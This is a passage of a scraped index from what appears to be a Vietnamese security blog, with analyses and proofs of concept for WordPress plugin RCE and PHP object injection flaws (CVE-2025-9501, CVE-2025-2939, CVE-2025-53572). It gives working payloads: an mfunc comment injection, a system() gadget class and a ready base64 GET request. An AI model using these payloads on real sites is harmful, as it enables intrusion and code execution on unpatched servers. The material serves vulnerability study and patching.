B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true ‚Üí Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is ‚Üí Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes ‚Üí shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rInstall v√† active plugin, h√†m th√†nh b∆∞·ªõc setup c∆° b·∫£n B·∫≠t t√πy ch·ªçn Page Cache C·∫•u W3TC_DYNAMIC_SECURITY trong wp-config.php Comment m·ªôt post b·∫•t k√¨ v·ªõi content : \u003c!-- mfuncvalue --\u003ephpinfo();\u003c!-- /mfuncvalue --\u003e K·∫øt qu·∫£\rGhi ch√∫ Gi√° tr·ªã c·ªßa W3TC_DYNAMIC_SECURITY c√≥ th·ªÉ b·ªã l·ªô khi qu√™n b·∫≠t t√≠nh nƒÉng Page Cache m√† s·ª≠ d·ª•ng n√≥ ·ªü n∆°i Unauthenticated User c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c. S·ª≠ d·ª•ng khi qu√™n b·∫≠t Page Cache\r","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-9501 xu·∫•t ph√°t t·ª´ vi·ªác plugin W3 Total Cache s·ª≠ d·ª•ng eval() ƒë·ªÉ x·ª≠ l√Ω c√°c kh·ªëi ‚Äúdynamic fragment caching‚Äù (\u003c!-- mfunc ... --\u003e) m√† kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc x√°c th·ª±c, l·ªçc ho·∫∑c sandbox n√†o. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ ch√®n tr·ª±c ti·∫øp m√£ PHP v√†o n·ªôi dung trang, v√† m√£ n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi trong giai ƒëo·∫°n shutdown, sau khi WordPress ƒë√£ k·∫øt th√∫c to√†n b·ªô x·ª≠ l√Ω ch√≠nh, d·∫´n ƒë·∫øn Remote Code Execution (RCE). V·∫•n ƒë·ªÅ c√†ng nghi√™m tr·ªçng h∆°n khi logic cache v√† x·ª≠ l√Ω ƒë·∫ßu ra n·∫±m ngo√†i v√≤ng ƒë·ªùi chu·∫©n c·ªßa WordPress, khi·∫øn c√°c l·ªõp b·∫£o v·ªá nh∆∞ hook, nonce ho·∫∑c ki·ªÉm tra quy·ªÅn truy c·∫≠p kh√¥ng c√≤n hi·ªáu l·ª±c. W3TC 2.8.13 ƒë√£ lo·∫°i b·ªè vi·ªác g·ªçi eval() trong c∆° ch·∫ø x·ª≠ l√Ω ƒë·ªông, ch√≠nh th·ª©c v√° l·ªó h·ªïng n√†y. ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rVi·ªác s·ª≠ d·ª•ng eval() trong s·∫£n ph·∫©m production g·∫ßn nh∆∞ lu√¥n d·∫´n ƒë·∫øn RCE n·∫øu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t nghi√™m ng·∫∑t. Plugin ƒë√£ x·ª≠ l√Ω n·ªôi dung ƒë·ªông sau to√†n b·ªô v√≤ng ƒë·ªùi WordPress, khi·∫øn nhi·ªÅu l·ªõp b·∫£o v·ªá c·ªßa core b·ªã bypass. Page Fragment Caching c·ªßa W3TC cho ph√©p ch·∫°y code PHP t·ª´ HTML comment ‚Äì ch·ªâ c·∫ßn m·ªôt c·∫•u h√¨nh sai ho·∫∑c thi·∫øu ch·∫∑n ƒë·∫ßu v√†o l√† ƒë·ªß cho t·∫•n c√¥ng. RCE ƒë∆∞·ª£c k√≠ch ho·∫°t trong register_shutdown_function(), khi·∫øn payload ch·∫°y ·ªü th·ªùi ƒëi·ªÉm cu·ªëi c·ªßa request ‚Äì kh√≥ b·ªã ph√°t hi·ªán b·ªüi qu√° tr√¨nh ph√¢n t√≠ch th√¥ng th∆∞·ªùng. C·∫≠p nh·∫≠t plugin ngay l·∫≠p t·ª©c l√† c√°ch b·∫£o v·ªá duy nh·∫•t trong tr∆∞·ªùng h·ª£p h·ªá th·ªëng v·∫´n ƒëang s·ª≠ d·ª•ng \u003c= 2.8.12. ƒê·ªëi v·ªõi m·ªçi h·ªá th·ªëng PHP, tuy·ªát ƒë·ªëi tr√°nh eval() n·∫øu kh√¥ng c√≥ sandbox v√† validation c·ª±c k·ª≥ ch·∫∑t. ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress W3 Total Cache Plugin \u003c 2.8.13 is vulnerable to Remote Code Execution (RCE) ","date":"2025-11-22","objectID":"/vi/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/vi/posts/2025-11-22-cve-2025-9501/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables ‚Äì Easy Data Table Builder Plugin.","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Ninja Tables ‚Äì Easy Data Table Builder c·ªßa WordPress t·ªìn t·∫°i l·ªó h·ªïng PHP Object Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn 5.0.18, do vi·ªác gi·∫£i tu·∫ßn t·ª± (deserialization) d·ªØ li·ªáu kh√¥ng tin c·∫≠y t·ª´ tham s·ªë args[callback]. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c ch√®n m·ªôt ƒë·ªëi t∆∞·ª£ng PHP ƒë·ªôc h·∫°i. CVE ID: CVE-2025-2939 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Tables ‚Äì Easy Data Table Builder Plugin ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Ninja Tables ‚Äì Easy Data Table Builder: 5.0.18 ‚Äì vulnerable 5.0.19 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v5.0.18): $callback = unserialize(base64_decode($params['callback'])); Trong ƒëo·∫°n m√£ n√†y, h√†m unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($params['callback'] sau khi gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng: Nguy c∆° Object Injection: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn Object Injection v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi Remote Code Execution (RCE). Thi·∫øu ki·ªÉm tra an to√†n: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize. Kh√¥ng c√≥ c∆° ch·∫ø fallback: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c. B·∫£n v√° (v5.0.19): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rThay th·∫ø unserialize() b·∫±ng json_decode(): Kh√¥ng c√≤n d√πng unserialize() ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng PHP Object Injection. ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rgetCallback() ƒë∆∞·ª£c g·ªçi trong h√†m registerAsyncRequestHandler() public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); ... }); } H√†m ƒëƒÉng k√Ω m·ªôt Ajax endpoint cho ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c (admin_post_nopriv_) v·ªõi action ƒë∆∞·ª£c l·∫•y t·ª´ makeAsyncRequestAction(): protected static function makeAsyncRequestAction() { return 'wpf-async-request-'.sha1( App::config()-\u003eget('app.slug') ); } Gi√° tr·ªã tr·∫£ v·ªÅ l√† chu·ªói \"wpf-async-request-\" n·ªëi v·ªõi sha1() c·ªßa app.slug. Bi·∫øt slug c·ªßa plugin l√† ninja-tables, gi√° tr·ªã cu·ªëi c√πng s·∫Ω l√†: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 $params l√† to√†n b·ªô d·ªØ li·ªáu trong args[...] c·ªßa request, sau khi b·ªè ƒëi c√°c th√¥ng tin ƒëi·ªÅu khi·ªÉn (action, args.url, args.method) =\u003e Khi g·ª≠i request t·ªõi endpoint /wp-admin/admin-post.php v·ªõi action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 th√¨ getCallback($params) s·∫Ω ƒë∆∞·ª£c g·ªçi. ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated ‚Üí RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated ‚Üí RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated ‚Üí RCE\"]\rgraph TD\rA[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"]\r--\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"]\rB --\u003e C[\"Plugin handler calls getCallback($params)\"]\rC --\u003e D[\"Decode base64 and unserialize payload\"]\rD --\u003e E[\"Malicious object instantiated ‚Üí RCE\"]\r","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Cho request ƒëi qua proxy c·ªßa BurpSuite G·ª≠i l·∫°i request v·ªõi args[callback] ch·ª©a chu·ªói serialized ƒë∆∞·ª£c encode base64 args[callback] = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:4:\"ls /\";}') GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1 Host: localhost K·∫øt qu·∫£\r","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rC√°c phi√™n b·∫£n \u003c= 5.0.18 c·ªßa plugin Ninja Tables x·ª≠ l√Ω tham s·ªë args[callback] kh√¥ng an to√†n, d·∫´n ƒë·∫øn vi·ªác th·ª±c thi unserialize() tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng m√† kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc x√°c th·ª±c n√†o. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c ƒë∆∞a v√†o payload ch·ª©a object ƒë·ªôc h·∫°i v√† th·ª±c thi m√£ tr√™n server. B·∫£n c·∫≠p nh·∫≠t 5.0.19 lo·∫°i b·ªè ho√†n to√†n vi·ªác s·ª≠ d·ª•ng unserialize() v√† thay th·∫ø b·∫±ng json_decode, gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ l·ªó h·ªïng. ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\runserialize() kh√¥ng ƒë∆∞·ª£c ph√©p d√πng cho d·ªØ li·ªáu nh·∫≠n t·ª´ client n·∫øu kh√¥ng c√≥ x√°c th·ª±c. Ajax hook admin_post_nopriv_* m·ªü b·ªÅ m·∫∑t t·∫•n c√¥ng cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p. Ch·ªâ c·∫ßn m·ªôt request HTTP l√† c√≥ th·ªÉ k√≠ch ho·∫°t khai th√°c. B·∫£n v√° 5.0.19 x·ª≠ l√Ω ƒë√∫ng h∆∞·ªõng b·∫±ng c√°ch chuy·ªÉn sang ƒë·ªãnh d·∫°ng an to√†n h∆°n nh∆∞ JSON. ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Ninja Tables ‚Äì Easy Data Table Builder Plugin \u003c= 5.0.18 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-21","objectID":"/vi/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/vi/posts/2025-11-21-cve-2025-2939/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Preserve Code Formatting Plugin.","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Deserialization of Untrusted Data trong Scott Reilly Preserve Code Formatting preserve-code-formatting cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn Preserve Code Formatting: t·ª´ n/a ƒë·∫øn \u003c= 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 5.0 CVSS severity: High (8.8) Required Privilege: Contributor Product: WordPress Preserve Code Formatting Plugin ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Preserve Code Formatting: 4.0.1 ‚Äì vulnerable 5.0 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v4.0.1): $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); Trong ƒëo·∫°n m√£ n√†y, h√†m unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($match[2] sau khi gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng: Nguy c∆° Object Injection: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn Object Injection v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi Remote Code Execution (RCE). Thi·∫øu ki·ªÉm tra an to√†n: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize. Kh√¥ng c√≥ c∆° ch·∫ø fallback: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c. B·∫£n v√° (v5.0): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rThay th·∫ø unserialize() b·∫±ng json_decode(): $decoded_data = str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $matches[2] ) ) ); if ( ! $this-\u003eis_content_safe( $decoded_data ) ) { return $matches[0]; } $data = json_decode( $decoded_data, true ); if ( $data === null \u0026\u0026 json_last_error() !== JSON_ERROR_NONE ) { $data = $decoded_data; } Kh√¥ng c√≤n d√πng unserialize() ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng PHP Object Injection. ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt filter: add_filter( 'content_save_pre', array( $this, 'preserve_postprocess' ), 100 ); Hook content_save_pre: ƒë∆∞·ª£c g·ªçi tr∆∞·ªõc khi n·ªôi dung b√†i vi·∫øt ƒë∆∞·ª£c l∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu. ƒê√¢y l√† th·ªùi ƒëi·ªÉm th√≠ch h·ª£p ƒë·ªÉ can thi·ªáp, ch·ªânh s·ª≠a ho·∫∑c l·ªçc n·ªôi dung. Khi filter ƒë∆∞·ª£c k√≠ch ho·∫°t th√¨ callback preserve_postprocess ƒë∆∞·ª£c g·ªçi: public function preserve_postprocess( $content, $preserve = false ) { $options = $this-\u003eget_options(); $preserve_tags = (array) $options['preserve_tags']; $wrap_multiline_code_in_pre = (bool) $options['wrap_multiline_code_in_pre']; $result = ''; foreach ( $preserve_tags as $tag ) { if ( $result ) { $content = $result; $result = ''; } $codes = preg_split( \"/(\\\\{\\\\!\\\\{{$tag}[^\\\\]]*\\\\}\\\\!\\\\}.*\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); foreach ( $codes as $code ) { if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { // Note: base64_decode is only being used to decode user-supplied content of code tags which // had been encoded earlier in the filtering process to prevent modification by WP. $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); if ( $preserve ) { $data = $this-\u003epreserve_code_formatting( $data ); } $code = \"\u003c{$match[1]}\u003e$data\u003c/$tag\u003e\"; if ( $preserve \u0026\u0026 $wrap_multiline_code_in_pre \u0026\u0026 ( 'pre' != $tag ) \u0026\u0026 preg_match( \"/\\n/\", $data ) ) { $code = '\u003cpre\u003e' . $code . '\u003c/pre\u003e'; } } $result .= $code; } } return $result; } ƒê·∫∑t breakpoint v√†o ƒë·∫ßu h√†m preserve_postprocess(), th·ª≠ t·∫°o m·ªôt post b·∫•t k·ª≥: POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1 Host: localhost Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953 ... {\"id\":129,\"content\":\"\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003ePayload\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\",\"title\":\"Test\",\"status\":\"pending\"} Gi√° tr·ªã c·ªßa $content\rTa th·∫•y $content s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi gi√° tr·ªã c·ªßa \"content\" ta truy·ªÅn khi t·∫°o post. $codes = preg_split( \"/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); Bi·ªÉu th·ª©c ch√≠nh quy tr√™n d√πng ƒë·ªÉ t√¨m ƒëo·∫°n m·ªü th·∫ª {!{$tag}...}!} v√† ƒë√≥ng th·∫ª {!{/$tag}!} c√πng n·ªôi dung b√™n trong. Tham s·ªë PREG_SPLIT_DELIM_CAPTURE gi√∫p gi·ªØ l·∫°i c·∫£ ƒëo·∫°n kh·ªõp trong m·∫£ng k·∫øt qu·∫£. Gi√° tr·ªã c·ªßa $tag\rN·∫øu $tag l√† code ho·∫∑c pre th√¨ s·∫Ω t√°ch ƒë∆∞·ª£c c√°c kh·ªëi preserve, c√≤n n·∫øu kh√¥ng kh·ªõp th√¨ k·∫øt qu·∫£ tr·∫£ v·ªÅ ch·ªâ l√† ch√≠nh chu·ªói $content ban ƒë·∫ßu. if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { ... } preg_match() ki·ªÉm tra xem $code c√≥ ch·ª©a th·∫ª preserve m·ªü {!{$tag}...}!} v√† ƒë√≥ng {!{/{$tag}}!} hay kh√¥ng. N·∫øu kh·ªõp, $match[1] l√† t√™n th·∫ª/thu·ªôc t√≠nh, $match[2] l√† n·ªôi dung b√™n trong. Gi√° tr·ªã c·ªßa $match\r$data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); Cu·ªëi c√πng, gi√° tr·ªã c·ªßa $match[2] s·∫Ω ƒë∆∞·ª£c decode base64, lo·∫°i b·ªè k√Ω t·ª± escape b·∫±ng stripslashes(), x√≥a token v√† unserialize() Th√¥ng tin\rƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE, ƒë·ªÉ khai th√°c ta c·∫ßn ƒë·∫∑c quy·ªÅn Contributor d√†nh cho vi·ªác t·∫°o b√†i vi·∫øt. ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e 